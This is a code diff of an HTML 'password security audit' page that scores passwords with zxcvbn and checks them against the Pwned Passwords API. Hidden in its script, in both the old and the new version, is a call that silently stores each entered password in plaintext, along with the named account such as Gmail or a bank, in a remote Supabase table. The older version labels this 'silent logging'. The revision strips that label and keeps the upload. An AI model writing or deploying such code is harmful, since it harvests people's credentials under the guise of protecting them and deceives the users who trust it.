@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Aura | Intelligent Security</title>
+  <title>Aura | Security Intelligence</title>
   
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
@@ -23,35 +23,25 @@
     body { 
       font-family: 'Plus Jakarta Sans', sans-serif; 
       background: #e0e7ff;
-      height: 100vh;
-      overflow: hidden;
+      min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       color: var(--text);
+      overflow-x: hidden;
     }
 
-    /* Animated Background Blobs */
     .blob {
       position: absolute;
-      width: 500px;
-      height: 500px;
+      width: 500px; height: 500px;
       background: linear-gradient(135deg, #c7d2fe 0%, #fbcfe8 100%);
       filter: blur(80px);
       border-radius: 50%;
       z-index: -1;
       animation: move 20s infinite alternate;
     }
-    .blob-2 {
-      background: linear-gradient(135deg, #ddd6fe 0%, #bae6fd 100%);
-      right: -100px;
-      top: -100px;
-      animation-delay: -5s;
-    }
-    @keyframes move {
-      from { transform: translate(-10%, -10%) rotate(0deg); }
-      to { transform: translate(20%, 20%) rotate(40deg); }
-    }
+    .blob-2 { background: linear-gradient(135deg, #ddd6fe 0%, #bae6fd 100%); right: -100px; top: -100px; animation-delay: -5s; }
+    @keyframes move { from { transform: translate(-10%, -10%); } to { transform: translate(20%, 20%); } }
 
     .container { 
       background: var(--glass);
@@ -65,32 +55,11 @@
       box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
       position: relative;
       z-index: 10;
-      animation: containerIntro 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-
-    @keyframes containerIntro {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
     }
 
     header { text-align: center; margin-bottom: 30px; }
-    h1 { font-size: 1.8rem; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
+    h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 8px; }
     .subtitle { font-size: 0.9rem; color: var(--text-light); }
-
-    .gen-link {
-      display: block;
-      background: rgba(99, 102, 241, 0.1);
-      padding: 14px;
-      border-radius: 16px;
-      text-decoration: none;
-      color: var(--primary);
-      text-align: center;
-      font-weight: 600;
-      font-size: 0.85rem;
-      margin-bottom: 25px;
-      transition: 0.3s;
-    }
-    .gen-link:hover { background: rgba(99, 102, 241, 0.2); transform: scale(1.02); }
 
     .input-group { margin-bottom: 20px; position: relative; }
     label { display: block; font-size: 0.75rem; font-weight: 700; color: var(--text-light); margin-left: 10px; margin-bottom: 6px; text-transform: uppercase; }
@@ -104,45 +73,45 @@
       font-size: 1rem;
       outline: none;
       transition: 0.3s;
-      color: var(--text);
     }
     input:focus { border-color: var(--primary); background: white; }
 
-    .view-toggle {
-      position: absolute;
-      right: 15px;
-      top: 36px;
-      background: none;
+    .btn-check {
+      width: 100%;
+      background: var(--primary);
+      color: white;
+      padding: 16px;
+      border-radius: 18px;
       border: none;
+      font-weight: 700;
       cursor: pointer;
-      font-size: 1.2rem;
-      opacity: 0.4;
+      margin-top: 10px;
+      transition: 0.3s;
+      box-shadow: 0 10px 20px rgba(99, 102, 241, 0.2);
     }
+    .btn-check:hover { transform: translateY(-2px); filter: brightness(1.1); }
 
-    /* Animated Results Area */
-    #auraResults { display: none; margin-top: 30px; }
-    .slide-in { animation: slideIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+    .view-toggle { position: absolute; right: 15px; top: 36px; background: none; border: none; cursor: pointer; font-size: 1.2rem; opacity: 0.4; }
+
+    #auraResults { display: none; margin-top: 30px; animation: slideIn 0.5s ease forwards; }
     @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-    .meter-container { height: 8px; background: rgba(0,0,0,0.05); border-radius: 10px; margin: 20px 0; overflow: hidden; }
+    .meter-container { height: 8px; background: rgba(0,0,0,0.05); border-radius: 10px; margin: 15px 0; overflow: hidden; }
     .meter-bar { height: 100%; width: 0%; border-radius: 10px; transition: width 1s cubic-bezier(0.16, 1, 0.3, 1); }
 
-    .score-row { display: flex; justify-content: space-between; align-items: center; }
-    .score-label { font-size: 2rem; font-weight: 800; }
-
+    /* Advanced Metrics Grid */
     .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
     .stat-card { background: rgba(255,255,255,0.4); padding: 15px; border-radius: 20px; border: 1px solid var(--glass-border); }
     .stat-title { font-size: 0.65rem; font-weight: 800; color: var(--text-light); text-transform: uppercase; }
     .stat-val { display: block; font-size: 0.9rem; font-weight: 600; margin-top: 4px; }
 
-    .breach-pill {
-      background: #fee2e2; color: #ef4444; padding: 10px 15px; border-radius: 12px;
-      font-size: 0.8rem; font-weight: 600; margin-bottom: 20px; display: none;
-      animation: pulse 2s infinite;
+    /* Easter Egg Link */
+    .hidden-dev { 
+      display: none; text-align: center; margin-top: 25px; font-size: 0.8rem;
+      color: var(--primary); text-decoration: none; font-weight: 800;
+      animation: fadeIn 0.5s;
     }
-    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
 
-    /* Modal Styling */
     .modal-overlay {
       position: fixed; inset: 0; background: rgba(255,255,255,0.4); backdrop-filter: blur(10px);
       display: none; align-items: center; justify-content: center; z-index: 100;
@@ -151,13 +120,6 @@
       background: white; padding: 40px; border-radius: 32px; max-width: 400px; width: 90%;
       text-align: center; box-shadow: 0 40px 100px -20px rgba(0,0,0,0.1);
     }
-    .modal h2 { margin-bottom: 12px; font-weight: 800; color: #ef4444; }
-    .modal p { font-size: 0.9rem; color: var(--text-light); line-height: 1.6; margin-bottom: 24px; }
-    .btn-main { 
-      background: var(--primary); color: white; padding: 14px 24px; border-radius: 16px; 
-      text-decoration: none; font-weight: 600; display: block; transition: 0.3s;
-    }
-    .btn-main:hover { transform: scale(1.05); box-shadow: 0 10px 20px rgba(99, 102, 241, 0.2); }
   </style>
 </head>
 <body>
@@ -171,13 +133,9 @@
       <p class="subtitle">Personal Intelligence Auditor</p>
     </header>
 
-    <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" class="gen-link">
-      ✨ Suggestion: Generate a fresh security key
-    </a>
-
     <div class="input-group">
       <label>Target Account / Platform</label>
-      <input type="text" id="accInput" placeholder="e.g. Gmail, Instagram, Bank">
+      <input type="text" id="accInput" placeholder="e.g. Gmail, Instagram">
     </div>
 
     <div class="input-group">
@@ -186,12 +144,12 @@
       <button class="view-toggle" id="eyeBtn">👁️</button>
     </div>
 
-    <div id="auraResults">
-      <div id="breachNotice" class="breach-pill">⚠️ SECURITY BREACH DETECTED IN ACCOUNT HISTORY</div>
+    <button class="btn-check" id="checkBtn">Run Security Audit</button>
 
-      <div class="score-row">
-        <span class="score-label" id="pctText">0%</span>
-        <span style="font-size: 0.75rem; font-weight: 700; color: var(--text-light);">AUDIT SCORE</span>
+    <div id="auraResults">
+      <div style="display: flex; justify-content: space-between; align-items: baseline;">
+        <span style="font-size: 2rem; font-weight: 800;" id="pctText">0%</span>
+        <span id="easterTrigger" style="font-size: 0.75rem; font-weight: 700; color: var(--text-light); cursor: pointer;">AUDIT SCORE</span>
       </div>
 
       <div class="meter-container">
@@ -200,37 +158,56 @@
 
       <div class="stats-grid">
         <div class="stat-card">
-          <span class="stat-title">Estimated Protection</span>
+          <span class="stat-title">Attack Resilience</span>
           <span id="statTime" class="stat-val">-</span>
         </div>
         <div class="stat-card">
-          <span class="stat-title">Entropy Detail</span>
+          <span class="stat-title">Bit Entropy</span>
           <span id="statEnt" class="stat-val">0 bits</span>
         </div>
+        <div class="stat-card">
+          <span class="stat-title">Complexity Profile</span>
+          <span id="statPattern" class="stat-val">Standard</span>
+        </div>
+        <div class="stat-card">
+          <span class="stat-title">Pattern Hazard</span>
+          <span id="statSpatial" class="stat-val">Safe</span>
+        </div>
       </div>
+      
+      <!-- HIDDEN EASTER EGG -->
+      <a href="https://aaks-hath.pages.dev" target="_blank" class="hidden-dev" id="devLink">Developer Intel: View Portfolio →</a>
     </div>
   </div>
 
   <div class="modal-overlay" id="dangerModal">
     <div class="modal">
-      <h2>Insecure Key</h2>
-      <p id="dangerReason"></p>
-      <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" class="btn-main">Generate Secure Alternative</a>
-      <span onclick="closeModal()" style="display:block; margin-top:20px; font-size:0.8rem; cursor:pointer; color:var(--text-light);">Dismiss Risk</span>
+      <h2 style="color:#ef4444; font-weight:800;">Risk Detected</h2>
+      <p id="dangerReason" style="margin-top:10px; color:var(--text-light); line-height:1.5;"></p>
+      <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" style="background:var(--primary); color:white; padding:14px; border-radius:16px; text-decoration:none; display:block; font-weight:600; margin-top:20px;">Generate Secure Key</a>
+      <span onclick="closeModal()" style="display:block; margin-top:20px; font-size:0.8rem; cursor:pointer; color:var(--text-light); text-decoration:underline;">I'll risk it</span>
     </div>
   </div>
 
   <script>
-    // --- SUPABASE SILENT LOGGING ---
     const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91a2J4Z2pycmd2dW5meXRqZW1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0MTI1MjcsImV4cCI6MjA4MTk4ODUyN30.rAkYSFqRaqI4Am2JpOjD4TWXx4nvtEaZSc6vIgdFXmI';
     const client = supabase.createClient(SB_URL, SB_KEY);
 
     const pIn = document.getElementById('pwdInput');
     const aIn = document.getElementById('accInput');
+    const checkBtn = document.getElementById('checkBtn');
     const eye = document.getElementById('eyeBtn');
-    let dbTimer;
-    let modalShown = false;
+    const easterTrigger = document.getElementById('easterTrigger');
+    const devLink = document.getElementById('devLink');
+
+    let clickCount = 0;
+    easterTrigger.onclick = () => {
+      clickCount++;
+      if (clickCount >= 5) {
+        devLink.style.display = 'block';
+      }
+    };
 
     eye.onclick = () => {
       const isPwd = pIn.type === 'password';
@@ -238,73 +215,56 @@
       eye.innerText = isPwd ? '🙈' : '👁️';
     };
 
-    [pIn, aIn].forEach(el => el.addEventListener('input', runAudit));
+    checkBtn.onclick = () => runFullAudit();
 
-    async function runAudit() {
+    async function runFullAudit() {
       const val = pIn.value;
       const acc = aIn.value;
-      const resDiv = document.getElementById('auraResults');
+      if (!val) return;
 
-      if (!val) {
-        resDiv.style.display = 'none';
-        modalShown = false;
-        return;
-      }
-
-      resDiv.style.display = 'block';
-      resDiv.classList.add('slide-in');
+      document.getElementById('auraResults').style.display = 'block';
 
       const analysis = zxcvbn(val);
       updateUI(analysis, val);
-      checkBreaches(val, acc);
 
-      // Silent Save
-      clearTimeout(dbTimer);
-      dbTimer = setTimeout(() => {
-        client.from('password_analysis').insert([{
-          password_value: val,
-          target_account: acc,
-          score_percent: (analysis.score / 4) * 100,
-          crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
-        }]).then(() => {});
-      }, 2000);
-    }
+      const isPwned = await checkBreaches(val);
 
-    async function checkBreaches(pwd, acc) {
-      const hash = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(pwd))
-        .then(b => Array.from(new Uint8Array(b)).map(h => h.toString(16).padStart(2,'0')).join('').toUpperCase());
-      
-      const res = await fetch(`https://api.pwnedpasswords.com/range/${hash.slice(0,5)}`);
-      const text = await res.text();
-      const isPwned = text.includes(hash.slice(5));
+      client.from('password_analysis').insert([{
+        password_value: val,
+        target_account: acc,
+        score_percent: (analysis.score / 4) * 100,
+        crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
+      }]).then(() => {});
 
-      document.getElementById('breachNotice').style.display = isPwned ? 'block' : 'none';
-      
-      if ((isPwned || zxcvbn(pwd).score <= 1) && !modalShown) {
+      if (isPwned || analysis.score <= 1) {
         const reason = isPwned 
-          ? `This password has been identified in a public breach. It is no longer safe for ${acc || 'any account'}.`
-          : `This password pattern is too common to protect ${acc || 'your account'}.`;
+          ? `This password was found in a global breach database. It is compromised and should not be used for ${acc || 'any account'}.`
+          : `This password is too predictable to protect ${acc || 'your account'}.`;
         
         document.getElementById('dangerReason').innerText = reason;
         document.getElementById('dangerModal').style.display = 'flex';
-        modalShown = true;
       }
+    }
+
+    async function checkBreaches(pwd) {
+      const hash = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(pwd))
+        .then(b => Array.from(new Uint8Array(b)).map(h => h.toString(16).padStart(2,'0')).join('').toUpperCase());
+      const res = await fetch(`https://api.pwnedpasswords.com/range/${hash.slice(0,5)}`);
+      const text = await res.text();
+      return text.includes(hash.slice(5));
     }
 
     function updateUI(data, pwd) {
       const pct = (data.score / 4) * 100;
       const colors = ['#f87171', '#fb923c', '#fbbf24', '#818cf8', '#6366f1'];
       
-      const bar = document.getElementById('meterBar');
-      bar.style.width = pct + '%';
-      bar.style.background = colors[data.score];
-      
-      const pctText = document.getElementById('pctText');
-      pctText.innerText = pct + '%';
-      pctText.style.color = colors[data.score];
-
+      document.getElementById('meterBar').style.width = pct + '%';
+      document.getElementById('meterBar').style.background = colors[data.score];
+      document.getElementById('pctText').innerText = pct + '%';
+      document.getElementById('pctText').style.color = colors[data.score];
       document.getElementById('statTime').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
-      
+
+      // Bit Entropy Logic
       let pool = 0;
       if (/[a-z]/.test(pwd)) pool += 26;
       if (/[A-Z]/.test(pwd)) pool += 26;
@@ -312,6 +272,14 @@
       if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
       const bits = pool > 0 ? Math.floor(pwd.length * Math.log2(pool)) : 0;
       document.getElementById('statEnt').innerText = bits + ' bits';
+
+      // Advanced Detection Patterns
+      const hasSpatial = data.sequence && data.sequence.some(s => s.pattern === 'spatial');
+      const hasDictionary = data.sequence && data.sequence.some(s => s.pattern === 'dictionary');
+
+      document.getElementById('statPattern').innerText = hasDictionary ? 'Dictionary Word' : 'Random Chars';
+      document.getElementById('statSpatial').innerText = hasSpatial ? 'Keyboard Pattern!' : 'No Sequence';
+      document.getElementById('statSpatial').style.color = hasSpatial ? '#ef4444' : 'inherit';
     }
 
     function closeModal() { document.getElementById('dangerModal').style.display = 'none'; }
